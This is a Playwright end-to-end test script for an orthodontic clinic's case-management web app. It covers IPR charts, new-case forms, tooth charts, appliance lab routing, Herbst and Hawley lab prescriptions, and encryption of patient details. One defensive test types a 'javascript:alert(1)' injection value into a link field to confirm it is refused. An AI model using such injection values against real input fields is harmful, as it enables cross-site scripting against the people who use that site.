  const iprSvgs = () => owner.$$eval('#iprBox .iprP', ps => ps.map(x => ({ p: x.dataset.p, vals: Array.from(x.querySelectorAll('svg text.v')).map(t => t.textContent).join(' '), bt: x.querySelectorAll('svg .bt').length, label: x.querySelector('svg').getAttribute('aria-label') })));
  let pan = await iprSvgs();
  check(pan.map(x => x.p).join(',') === 'visit,cum,space' && pan[0].vals === '0.2' && /LR3–LR2 0\.2mm/.test(pan[0].label) && pan[1].vals === '0.2 0.2' && pan[2].vals === '0.3' && pan[2].bt === 1 && /Black triangles: UR1–UL1/.test(pan[2].label),
    'the IPR section draws the IPR Tracker’s chart: this visit (LR3–LR2 0.2), so far, the 0.3 space and ▼ at UR1–UL1');
  check(/^Sep 28 visit · IPR 0\.2 mm · 0\.4 mm so far · spaces 0\.3 mm · 1 black triangle$/.test(await owner.textContent('#dsS-ipr')), 'its heading sums up the visit (' + await owner.textContent('#dsS-ipr') + ')');
  check(!(await owner.isVisible('#drawer :text("From the IPR Tracker")')), 'no second “From the IPR Tracker” box');
  await put('nlo/ipr/visits/p1/v3', { id: 'v3', patient_uuid: 'p1', date: '2026-10-01', created_at: '2026-10-01T10:00:00Z', upper_ipr: { 'UL2|UL3': '0.1' }, lower_ipr: {}, upper_spaces: {}, lower_spaces: {}, upper_bt: {}, lower_bt: {} });
  await owner.click('#iprBox [data-act=iprRefresh]');
  await owner.waitForSelector('#iprBox [data-act=iprUse]', { timeout: 20000 });
  check(/3 visits on file/.test(await owner.textContent('#iprBox')) && /Use this visit in the chart note/.test(await owner.textContent('#iprBox [data-act=iprUse]')), 'refresh picks up a newer IPR visit (and offers it for the chart note)');
  pan = await iprSvgs();
  check(pan.map(x => x.p).join(',') === 'visit,cum' && pan[0].vals === '0.1' && pan[1].vals === '0.2 0.1 0.2', 'the chart redraws for the newer visit (no spaces that visit, so no spaces panel)');
  await owner.click('#iprBox [data-act=iprUse]');
  await owner.waitForSelector('#noteTxt:has-text("UL2-UL3 0.1mm")', { timeout: 20000 }); // (the chart note pastes as plain ASCII)
  check(true, '"Use this visit in the chart note" saves the new note (encrypted like the rest)');
  // folded, the way the panel opens on a computer where nobody tapped Expand all: the IPR heading still sums up the visit
  await owner.click('#drawer [data-act=dsAll]');
  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#drawer .ds:not(.line)')).every(x => !x.classList.contains('open') && x.querySelector('.dsBd').hidden) && localStorage.getItem('nloCases.panelOpen') === null), 'Collapse all folds every section (and forgets Expand all)');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await openByName(owner, 'Ivy Pulltest');
  await owner.waitForFunction(() => /^Oct 1 visit · IPR 0\.1 mm · 0\.5 mm so far$/.test((document.querySelector('#dsS-ipr') || {}).textContent || ''), null, { timeout: 20000 }).catch(() => {});
  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#drawer .ds:not(.line)')).every(x => !x.classList.contains('open'))) && /^Oct 1 visit · IPR 0\.1 mm · 0\.5 mm so far$/.test(await owner.textContent('#dsS-ipr')), 'reopened folded; the IPR heading reads the newer visit from the IPR Tracker (' + await owner.textContent('#dsS-ipr') + ')');
  await owner.click('#drawer .ds[data-ds=ipr] .dsTg'); await owner.waitForSelector('#iprBox .iprP[data-p=visit] svg', { timeout: 10000 });
  check(await owner.isVisible('#iprBox .stat:has-text("In the chart note")'), 'tapping the IPR heading shows the chart (now in the chart note)');
  await owner.click('#drawer [data-act=dsAll]'); // Expand all again for the rest of these tests
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Titan: the link isn\'t asked any more (Amir, 3 Oct 2026: "not using it now"); a case that has one keeps it');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=nla]'); await owner.fill('#cf-patient', 'Tobias Titancase');
  check(!(await owner.isVisible('#cf-titanUrl')), 'New case, in-house: no Titan link section');
  // New case asks what an in-house set is before it creates it (Amir, 3 Oct 2026)
  await owner.click('#ncSave'); await owner.waitForSelector('#ncErr .lockErr:has-text("Pick what this set is")', { timeout: 10000 });
  check(await owner.evaluate(() => document.querySelector('#ncForm .pickRow[data-g=initial]').classList.contains('need')) && await owner.isVisible('#ncForm'), 'an in-house case needs first set / refinement / mid-course / finishing before it can be created (that row is outlined)');
  await owner.click('.pickRow[data-g=initial] .pick[data-v=yes]');
  check(await owner.evaluate(() => !document.querySelector('#ncForm .pickRow[data-g=initial]').classList.contains('need') && !document.querySelector('#ncErr .lockErr')), 'tapping one clears the outline and the message');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  // a link saved on a case before (put there through the app's own save) still shows, and Edit still refuses a non-https one
  await owner.evaluate(async () => { const c = openCases().find(x => x.patient === 'Tobias Titancase'); await B.mutateCase(c.id, d => { d.titanUrl = 'https://titan.example/cases/12345'; }, { a: 'edit', fields: ['titanUrl'] }); });
  await openByName(owner, 'Tobias Titancase');
  await owner.waitForSelector('#drawer a:has-text("Open this case in Titan")', { timeout: 15000 });
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer #cf-titanUrl');
  await owner.fill('#drawer #cf-titanUrl', 'javascript:alert(1)'); await owner.click('#drawer [data-act=saveEdit]');
  await owner.waitForSelector('#drawerNotice .notice.bad:has-text("https://")', { timeout: 10000 }); check(true, 'Edit: a case with a Titan link shows it, and a non-https one is refused');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.waitForSelector('#drawer a:has-text("Open this case in Titan")', { timeout: 10000 });
  const href = await owner.getAttribute('#drawer a:has-text("Open this case in Titan")', 'href');
  check(href === 'https://titan.example/cases/12345', 'Open this case in Titan goes to the saved link');
  check((await owner.getAttribute('#drawer a:has-text("Open this case in Titan")', 'rel')).includes('noopener'), 'Titan link opens safely in a new tab');
  check(await owner.getAttribute('#drawer .portals a:has-text("Open Titan (web)")', 'href') === 'https://client.titandentaldesign.com/Live/index.html'
    && await owner.getAttribute('#drawer .portals a:has-text("Open Titan beta (web)")', 'href') === 'https://client.titandentaldesign.com/EA/index.html', 'in-house cases open Titan’s web version and its beta');
  await owner.evaluate(() => { window.__copied = null; navigator.clipboard.writeText = t => { window.__copied = t; return Promise.resolve(); }; });
  await owner.evaluate(() => { const a = document.querySelector('#drawer .portals a[href*="titandentaldesign.com/EA"]'); a.addEventListener('click', e => e.preventDefault(), { once: true }); a.click(); });
  await owner.waitForFunction(() => window.__copied, null, { timeout: 5000 }).catch(() => {});
  check(await owner.evaluate(() => window.__copied) === 'Tobias Titancase', 'opening Titan copies the patient’s name to paste in Titan’s search');
  await owner.evaluate(() => { delete navigator.clipboard.writeText; }); // the real clipboard again (later steps read it)
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Tap-first form: choices land on the case');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncSave'); await owner.waitForSelector('#ncErr .lockErr'); check(/case type/i.test(await owner.textContent('#ncErr')), 'asks for a case type first');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.fill('#cf-patient', 'Petra Tapform');
  await owner.click('.pickRow[data-g=initial] .pick[data-v=no]');
  await owner.click('.pickRow[data-g=assistant] .pick:has-text("Gwen")');
  await owner.click('.pickRow[data-g=instrPicks] .pick[data-v="Resolve black triangles"]');
  await owner.click('.pickRow[data-g=goal_midline] .pick[data-v=improve]');
  await owner.click('.pickRow[data-g=goal_ob] .pick[data-v=maintain]');
  await owner.click('.pickRow[data-g=extras] .pick:has-text("No elastics")');
  await owner.fill('#cf-cc', 'My bite feels off'); // the patient's own words (Amir, 3 Oct 2026: no CC buttons)
  await owner.click('.pickRow[data-g=scanner] .pick[data-v=iTero]'); // the iTero's drawer (3 Oct 2026)
  check(await owner.inputValue('#cf-detail') === 'Aligners (Oliv) – refinement', 'what’s-being-made fills itself from the taps');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Petra Tapform');
  check(await owner.isVisible('#drawer .txt:has-text("Improve midline; Maintain overbite; Resolve black triangles")'), 'tapped instructions (Maintain/Improve and pictures) saved as text');
  check(await owner.isVisible('#drawer .badge:has-text("No elastics")') && await owner.isVisible('#drawer .badge:has-text("Refinement")'), 'extras and refinement shown on the case');
  check(/Gwen/.test(await owner.textContent('#drawer .kv')), 'assistant saved from a tap');
  check(await owner.isVisible('#drawer .ccBox:has-text("My bite feels off")') && /from last visit/.test(await owner.textContent('#drawer .ccBox')), 'the patient’s words saved as typed (a refinement: CC from last visit)');
  check(await owner.getAttribute('#drawer a.scanLink', 'href') === 'https://myitero.com/' && /iTero/.test(await owner.textContent('#drawer a.scanLink')), 'the iTero picked from its drawer: the case’s Scanner links to MyiTero');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.locator('#drawer .pickRow[data-g=instrPicks] .pick[aria-pressed=true]').count()) === 1
    && (await owner.getAttribute('#drawer .pickRow[data-g=goal_midline] .pick[data-v=improve]', 'aria-pressed')) === 'true'
    && (await owner.getAttribute('#drawer .pickRow[data-g=goal_ob] .pick[data-v=maintain]', 'aria-pressed')) === 'true', 'editing restores the tapped choices');
  await owner.click('#drawer .pickRow[data-g=goal_midline] .pick[data-v=improve]');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
  await owner.waitForFunction(() => !Array.from(document.querySelectorAll('#drawer .txt')).some(e => /midline/i.test(e.textContent)), null, { timeout: 10000 }).catch(() => { });
  check(!(await owner.isVisible('#drawer .txt:has-text("Midline")')), 'un-tapping an instruction removes it');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Petra Tapform') && !dump.includes('Resolve black') && !dump.includes('My bite feels off'), 'tapped details (and the patient’s words) are encrypted too');

  console.log('\n# Finishing aligners: an answer under In-house (it replaced Reset; its own tile until 3 Oct 2026)');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  check(!(await owner.isVisible('.tt[data-tile=reset]')), 'no Reset button');
  check((await owner.locator('#ncForm .tt[data-tile=finishing]').count()) === 0, 'Finishing aligners is no longer its own tile');
  await owner.click('#ncForm .tt[data-tile=oliv]');
  check(!(await owner.isVisible('#ncForm .pickRow[data-g=initial] .pick[data-v=fin]')), 'outside aligners don’t offer Finishing aligners');
  await owner.click('#ncForm .tt[data-tile=nla]');
  check(await owner.isVisible('#ncForm .pickRow[data-g=initial] .pick[data-v=fin]'), 'In-house offers Finishing aligners next to Yes / No / Mid-course');
  await owner.click('#ncForm .pickRow[data-g=initial] .pick[data-v=fin]'); await owner.fill('#cf-patient', 'Fiona Finisher');
  check(await owner.inputValue('#cf-detail') === 'Finishing aligners', 'detail reads Finishing aligners');
  check(!(await owner.isVisible('#cf-titanUrl')), 'no Titan link asked (in-house finishing)');
  check(await owner.inputValue('#cf-labDate') === await owner.evaluate(() => addDays(todayISO(), 21)) && await owner.inputValue('#cf-deliveryDate') === await owner.evaluate(() => addDays(todayISO(), 28)), 'aligner dates fill in (lab completion +21, delivery +28)');
  await owner.click('#cf-tc [data-tq=ant]');
  await owner.click('#cf-tc [data-tool=implant]'); await owner.click('#cf-tc .tooth[data-t=UL6]');
  await owner.click('#cf-tc [data-tool=noatt]'); await owner.click('#cf-tc .tooth[data-t=LL3]');
  await owner.click('#cf-tc [data-tool=nomove]'); await owner.click('#cf-tc [data-tq=post]');
  check(await owner.textContent('#cf-teethSum') === 'No attachment: UR3 to UL3, LR3 to LL2\nImplant: UL6\nDon’t move: all posteriors (4–7)', 'posteriors in one tap; whole groups named in the summary');
  await owner.click('#cf-tc [data-tq=post]');
  check(await owner.textContent('#cf-teethSum') === 'No attachment: UR3 to UL3, LR3 to LL2\nImplant: UL6', 'tooth chart: anteriors in one tap, single teeth toggle, summary reads in Palmer');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=inhouse]');
  await owner.waitForSelector('section[aria-label="TxP needed"] .kc:has-text("Fiona Finisher")', { timeout: 20000 });
  check(true, 'lands on the in-house board at TxP needed');
  await owner.click('.kc:has-text("Fiona Finisher")'); await owner.waitForSelector('#drawer .tc.ro');
  check(await owner.isVisible('#drawer .txt:has-text("Implant: UL6")') && (await owner.locator('#drawer .tc.ro .tooth.m-noatt').count()) === 11, 'case view shows the chart and its summary');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check(await owner.evaluate(() => { const c = openCases().find(x => x.patient === 'Fiona Finisher'); return c.type === 'nla' && c.variant === 'finishing' && !c.initial; }), 'saved as an in-house case, finishing (as before)');
  check((await owner.getAttribute('#drawer .tt[data-tile=nla]', 'aria-checked')) === 'true' && (await owner.getAttribute('#drawer .pickRow[data-g=initial] .pick[data-v=fin]', 'aria-pressed')) === 'true', 'editing keeps it as Finishing aligners (In-house, Finishing picked)');
  check(await owner.isVisible('#drawer .tooth.m-implant[data-t=UL6]'), 'editing restores the tooth chart');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Teeth: No IPR, No attachments, crowns, implants, pontics');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.fill('#cf-patient', 'Theo Toothchart');
  await owner.click('.pickRow[data-g=initial] .pick[data-v=mid]');
  check(await owner.inputValue('#cf-detail') === 'Aligners (Oliv) – mid-course correction', 'mid-course correction is a kind of submission');
  check(!(await owner.isVisible('#cf-noattScope')), 'no attachment choices until the tile is tapped');
  await owner.click('#cf-noatt'); await owner.click('#cf-noattScope [data-scope=uant]');
  check(await owner.textContent('#cf-teethSum') === 'No attachment: upper anteriors (3–3)' && await owner.textContent('#cf-noattSub') === 'Upper anteriors', 'No attachments → upper anteriors marks UR3 to UL3');
  await owner.click('#cf-noattScope [data-scope=all]');
  check((await owner.locator('#cf-tc .tooth.m-noatt').count()) === 28, 'No attachments → all teeth');
  await owner.click('#cf-noattScope [data-scope=ant]');
  check(await owner.textContent('#cf-teethSum') === 'No attachment: all anteriors (3–3)', 'No attachments → all anteriors');
  await owner.click('.rxTile[data-v="No IPR"]');
  await owner.click('#cf-tc [data-tool=crown]'); await owner.click('#cf-tc .tooth[data-t=UR1]');
  await owner.click('#cf-tc [data-tool=implant]'); await owner.click('#cf-tc .tooth[data-t=LL6]');
  await owner.click('#cf-tc [data-tool=pontic]'); await owner.click('#cf-tc .tooth[data-t=UL2]');
  await owner.click('#cf-tc [data-tool=missing]'); await owner.click('#cf-tc .tooth[data-t=LR7]');
  await owner.click('#cf-tc [data-tool=nomove]'); await owner.click('#cf-tc [data-tq=post]');
  check((await owner.locator('#cf-tc .tooth[data-t=UR1] .crown.cr').count()) === 1, 'a crowned tooth turns yellow');
  check((await owner.locator('#cf-tc .tooth[data-t=LL6] .tcImp').count()) === 1 && (await owner.locator('#cf-tc .tooth[data-t=LL6] .root').count()) === 0 && (await owner.locator('#cf-tc .tooth[data-t=LL6] .crown.imp').count()) === 1, 'an implant is a grey crown with a screw instead of a root');
  check((await owner.locator('#cf-tc .tooth[data-t=UL2] .root').count()) === 0 && (await owner.locator('#cf-tc .tooth[data-t=UR2] .root').count()) === 1, 'a pontic has no root');
  check((await owner.locator('#cf-tc .tooth[data-t=LR7].m-missing').count()) === 1 && !(await owner.locator('#cf-tc .tooth[data-t=LR7]').evaluate(e => e.classList.contains('m-nomove'))), 'marking a whole group skips missing teeth');
  await owner.click('#cf-tc [data-tool=implant]'); await owner.click('#cf-tc .tooth[data-t=UL2]');
  check(await owner.locator('#cf-tc .tooth[data-t=UL2]').evaluate(e => e.classList.contains('m-implant') && !e.classList.contains('m-pontic')), 'a tooth is an implant or a pontic, not both');
  await owner.focus('#cf-tc .tooth[data-t=LR1]'); await owner.keyboard.press('Enter');
  check(await owner.locator('#cf-tc .tooth[data-t=LR1]').evaluate(e => e.classList.contains('m-implant') && document.activeElement === e), 'teeth work from the keyboard too');
  await owner.keyboard.press('Enter');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Theo Toothchart');
  check(await owner.isVisible('#drawer .badge:has-text("No IPR")') && await owner.isVisible('#drawer .badge:has-text("Mid-course correction")'), 'case shows No IPR and Mid-course correction');
  check(await owner.isVisible('#drawer .txt:has-text("Crown: UR1")') && await owner.isVisible('#drawer .txt:has-text("Implant: UL2, LL6")') && await owner.isVisible('#drawer .tc.ro .tooth[data-t=LL6] .tcImp'), 'chart and summary saved on the case');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer #cf-noattScope [data-scope=ant]', 'aria-pressed')) === 'true' && (await owner.getAttribute('#drawer .rxTile[data-v="No IPR"]', 'aria-pressed')) === 'true', 'editing restores No IPR and the No attachments choice');
  await owner.click('#drawer #cf-noatt');
  check(!/No attachment/.test(await owner.textContent('#drawer #cf-teethSum')) && !(await owner.isVisible('#drawer #cf-noattScope')), 'turning No attachments off clears those marks');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Theo Toothchart') && !dump.includes('Crown: UR1'), 'tooth chart details are encrypted too');

  console.log('\n# Mouthguard (in-house, complimentary)');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=mouthguard]'); await owner.fill('#cf-patient', 'Milo Guardsman');
  check(await owner.isVisible('.pickRow[data-g=arches]') && !(await owner.isVisible('.pickRow[data-g=retKinds]')), 'asks for the arch, not TT’s/WT’s');
  check(!(await owner.isVisible('.pickRow[data-g=initial]')), 'no refinement question for a mouthguard');
  await owner.click('.pickRow[data-g=arches] .pick[data-v=Upper]');
  check(await owner.inputValue('#cf-detail') === 'Mouthguard (U)', 'detail reads Mouthguard (U)');
  check(await owner.inputValue('#cf-deliveryDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)), 'delivered in two office days, like retainers');
  check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'assigned to whoever creates it');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
  // marked with the Mouthguard tile's picture since 4 Oct 2026 (was the name); its alt text still says Mouthguard
  await owner.waitForSelector('section[aria-label="Printing"] .kc:has-text("Milo Guardsman") .tlogo.tpic img[data-pic=mouthguard][alt="Mouthguard"]', { timeout: 20000 });
  check(true, 'lands on the retainers & mouthguards board at Printing, marked with the mouthguard picture');

  console.log('\n# Appliances: the lab is picked from the office routing');
  const labNow = async () => (await owner.locator('.pickRow[data-g=lab] .pick[aria-pressed=true]').allTextContents()).join('|');
  const tapAppl = v => owner.click('.pickRow[data-g=appliances] .pick[data-v="' + v + '"]');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]'); await owner.fill('#cf-patient', 'Dmitri Distalson');
  check(!(await owner.isVisible('.pickRow[data-g=initial]')) && !(await owner.isVisible('.pickRow[data-g=initialDE]')), 'no refinement question for appliances');
  await owner.click('#ncSave'); await owner.waitForSelector('#ncErr .lockErr:has-text("Pick the appliance")', { timeout: 10000 });
  check(await owner.evaluate(() => document.querySelector('#ncForm .pickRow[data-g=appliances]').classList.contains('need')) && await owner.isVisible('#ncForm'), 'an appliance case needs its appliance before it can be created (that row is outlined)');
  await tapAppl('MSE'); check(await labNow() === 'Specialty Orthodontic Lab', 'MSE → Specialty Orthodontic Lab');
  await tapAppl('MSE'); await tapAppl('Rapid Palatal Expander (RPE)'); check(await labNow() === 'Specialty Orthodontic Lab', 'RPE → Specialty Orthodontic Lab (Amir, 4 Oct 2026: “Switch to Specialty”)');
  await tapAppl('Rapid Palatal Expander (RPE)'); await tapAppl('Schwartz'); check(await labNow() === 'Specialty Orthodontic Lab', 'Schwartz → Specialty Orthodontic Lab (Amir, 4 Oct 2026: the lower Schwarz on Specialty’s Functional Rx)');
  await tapAppl('Schwartz'); await tapAppl('Other metal appliance'); check(await labNow() === 'Specialty Orthodontic Lab', 'Other metal appliance → Specialty Orthodontic Lab');
  await tapAppl('Other metal appliance'); await tapAppl('Rapid Palatal Expander (RPE)');
  await tapAppl('MARPE');
  check(await owner.inputValue('#cf-tile') === 'marpe' && (await owner.getAttribute('#ncForm .tt[data-tile=marpe]', 'aria-checked')) === 'true' && await owner.isVisible('.pickRow[data-g=records]'), 'tapping MARPE under Appliance switches the case to the MARPE tile (its own steps)');
  await owner.click('#ncForm .tt[data-tile=appliance]');
  await tapAppl('Rapid Palatal Expander (RPE)'); await tapAppl('MARA'); check(await labNow() === 'Specialty Orthodontic Lab', 'MARA → Specialty Orthodontic Lab');
  await tapAppl('MARA'); await tapAppl('D2 distalizer'); check(await labNow() === 'In-house (NL Lab)', 'D2 distalizer → in-house (NL Lab)');
  check(await owner.inputValue('#cf-stage') === 'mfg' && await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'in-house D2 starts in Manufacturing with Dr. A');
  await tapAppl('MSE'); check(/different labs/.test(await owner.textContent('#cf-labHint')), 'mixing labs says to make one case per lab');
  await tapAppl('MSE');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.click('#ncForm .tt[data-tile=appliance]');
  check(await labNow() === 'In-house (NL Lab)' && await owner.inputValue('#cf-stage') === 'mfg', 'switching type and back keeps the D2 routing');
  check(await owner.inputValue('#cf-detail') === 'D2 distalizer', 'detail reads D2 distalizer');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Dmitri Distalson');
  check(await owner.isVisible('#drawer .badge:has-text("In-house (NL Lab)")') && await owner.isVisible('#drawer .badge:has-text("D2 distalizer")'), 'case shows the appliance and its lab');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]');
  await owner.click('.pickRow[data-g=lab] .pick[data-v="Partners Dental Solutions"]'); await tapAppl('MSE');
  check(await labNow() === 'Partners Dental Solutions', 'a lab tapped by hand is kept');
  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#ncForm .pickRow[data-g=lab] .pick')).every(b => { const i = b.querySelector('img[data-logo]'); return i && i.complete && i.naturalWidth > 0 && b.textContent.trim() === b.dataset.v; })), 'the Lab choices show the labs’ logos (names kept for screen readers)');
  await owner.mouse.click(5, 5);
  check(await owner.isVisible('#ncForm'), 'a stray click outside the form does not throw it away');
  await owner.click('.modal [data-act=closeModal]');

  console.log('\n# Herbst Rx for Specialty: Dr. A’s details once, filled out in New case, stored encrypted, the PDF for staff');
  // Dr. A's details for every Rx (made up here) are office settings, not patient data; a live redraw can land on a box, so retry
  const rxSet = async (sel, val, ok) => { for (let i = 0; i < 3; i++) { await owner.fill(sel, val); await owner.press(sel, 'Tab'); try { await owner.waitForFunction(ok, null, { timeout: 8000 }); return true; } catch (e) { console.log('   (retrying ' + sel + ')'); } } return false; };
  await owner.click('#nav-today'); await owner.click('#nav-admin'); await owner.waitForSelector('#rxAdmin');
  check(await rxSet('#rxo-acct', 'TEST-4471', () => ((S.settings || {}).rxOffice || {}).acct === 'TEST-4471')
    && await rxSet('#rxo-license', 'DN 99999', () => ((S.settings || {}).rxOffice || {}).license === 'DN 99999'), 'Lab Rx: the Specialty account # and license # are saved');
  check(await rxSet('[data-rxprice=band]', '18.25', () => JSON.parse((S.settings || {}).rxPrices || '{}').band === 18.25), 'Lab Rx: a price changed ($18.25 a band)');
  const rxSt = (await fsDump()).find(d => d.name.endsWith('/meta/settings'));
  check(rxSt && JSON.stringify(rxSt.fields.rxOffice || {}).includes('TEST-4471'), 'they live in the office settings (no patient data there)');
  await owner.click('#nav-today'); await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]'); await owner.fill('#cf-patient', 'Hollis Herbstwick');
  check(!(await owner.isVisible('#cf-rxSec')), 'no Herbst Rx before a Herbst is picked');
  await tapAppl('Herbst');
  check(await owner.isVisible('#cf-rxSec') && await labNow() === 'Specialty Orthodontic Lab', 'Herbst → Specialty: the Herbst Rx shows');
  await owner.fill('#cf-deliveryDate', await owner.evaluate(() => addDays(todayISO(), 30)));
  await owner.click('#ncForm [data-rxform=edit]'); await owner.waitForSelector('#rxWrap .rxArch.live');
  for (const [g, v] of [['design', 'cantilever'], ['mech', 'm4']]) await owner.click('#rxWrap .rxB[data-rxg=' + g + '][data-v="' + v + '"]');
  // (since 4 Oct 2026 the design puts bands on its anchor teeth — a cantilever on the upper and lower 6s — and crowns are off for our Herbsts)
  check(await owner.evaluate(() => JSON.stringify(RXE.rx.teeth)) === '{"UR6":"band","UL6":"band","LR6":"band","LL6":"band"}' && await owner.getAttribute('#rxWrap [data-rxtool=crown]', 'aria-disabled') === 'true', 'the cantilever puts bands on the 6s; crowns are greyed out');
  await owner.fill('#rxWrap [data-rxf=notes]', 'secret-rx-note-5521');
  check(/\$360\.00/.test(await owner.textContent('#rxTot')), 'estimate: $220.50 + $66.50 + 4 × $18.25 = $360.00 (with Dr. A’s band price)');
  await owner.click('#rxWrap [data-rxa=done]'); await owner.waitForSelector('#rxWrap', { state: 'detached' });
  check(/Cantilever Herbst · M4 MiniScope · 4 bands/.test(await owner.textContent('#cf-rxSum')), 'the New case form shows the Rx’s summary');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('secret-rx-note-5521') && !dump.includes('specialty-herbst') && !dump.includes('Herbstwick') && !dump.includes('cantilever'), 'the Rx is stored encrypted with the case (nothing about it readable in the database)');
  await openByName(gwen, 'Hollis Herbstwick'); await gwen.waitForSelector('#drawer [data-ds=rx]', { timeout: 20000 });
  check(/Cantilever Herbst/.test(await gwen.textContent('#drawer [data-ds=rx] .dsS')) && /\$360\.00/.test(await gwen.textContent('#drawer [data-ds=rx]')), 'Gwen sees the Herbst Rx and its estimate');
  const [rxDl] = await Promise.all([gwen.waitForEvent('download'), gwen.click('#drawer [data-ds=rx] .pickRow [data-act=rxPdf]')]);
  const rxPdf = fs.readFileSync(await rxDl.path()).toString('latin1');
  check(rxDl.suggestedFilename().startsWith('Herbst Rx - Hollis Herbstwick - ') && rxPdf.startsWith('%PDF-') && rxPdf.includes('(TEST-4471)') && rxPdf.includes('(DN 99999)') && rxPdf.includes('(Hollis Herbstwick)'), 'Gwen downloads Specialty’s form filled in (account #, license #, patient)');
  await gwen.click('#drawer [data-ds=rx] [data-act=rxEdit]'); await gwen.waitForSelector('#rxWrap');
  check(!(await gwen.$('#rxWrap [data-rxa=saveDef]')), 'staff have no “Save as our usual Herbst”');
  await gwen.click('#rxWrap .rxB[data-rxg=rests][data-v=U]'); await gwen.click('#rxWrap [data-rxa=done]');
  await owner.waitForFunction(() => { const c = openCases().find(x => x.patient === 'Hollis Herbstwick'); return !!(c && c.rx && (c.rx.rests || []).includes('U')); }, null, { timeout: 20000 });
  check(true, 'Gwen’s change to the Rx reaches Dr. A live');
  await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#nav-admin'); await owner.waitForSelector('#rxAdmin'); await owner.click('#rxAdmin [data-act=rxPricesReset]');
  await owner.waitForFunction(() => rxPrices().band === 17.75, null, { timeout: 15000 });
  check(true, 'prices back to Specialty’s list');
  await owner.click('#nav-today');

  console.log('\n# Retainer Rx for Specialty (Amir, 4 Oct 2026: "here is the Rx for hawley. do the same"): New case, stored encrypted, the PDF for staff');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]'); await owner.fill('#cf-patient', 'Hazel Hawleywick');
  await tapAppl('Hawley retainers'); await owner.click('#ncForm .pickRow[data-g=hawleyArch] .pick[data-v=Upper]'); await owner.click('#ncForm .pickRow[data-g=acrylic] .pick[data-v=Teal]');
  check(await owner.isVisible('#cf-rxRetSec') && await labNow() === 'Specialty Orthodontic Lab' && !(await owner.isVisible('#cf-rxHint')) && !(await owner.isVisible('#cf-rxSec')),
    'Hawley retainers → Specialty (the routing since 4 Oct 2026): the Retainer Rx shows right away (not the Herbst Rx)');
  await owner.fill('#cf-deliveryDate', await owner.evaluate(() => addDays(todayISO(), 30)));
  await owner.click('#ncForm [data-rxform=edit][data-kind=ret]'); await owner.waitForSelector('#rxWrap .rxArch.live');
  check(await owner.getAttribute('#rxWrap .rxB[data-rxg=claspU][data-v=adams]', 'aria-pressed') === 'true', 'a Hawley starts with Adams clasps on the 6s (Dr. A’s usual, 4 Oct 2026)');
  await owner.fill('#rxWrap [data-rxf=notes]', 'secret-ret-note-7731');
  check(/\$88\.50/.test(await owner.textContent('#rxTot')), 'estimate: upper Hawley $61 + Adams clasps $27.50 = $88.50 (Teal is a free Specialty color)');
  await owner.click('#rxWrap [data-rxa=done]'); await owner.waitForSelector('#rxWrap', { state: 'detached' });
  check(/Hawley \(upper\)/.test(await owner.textContent('#cf-rxRetSum')), 'the New case form shows the Retainer Rx’s summary');
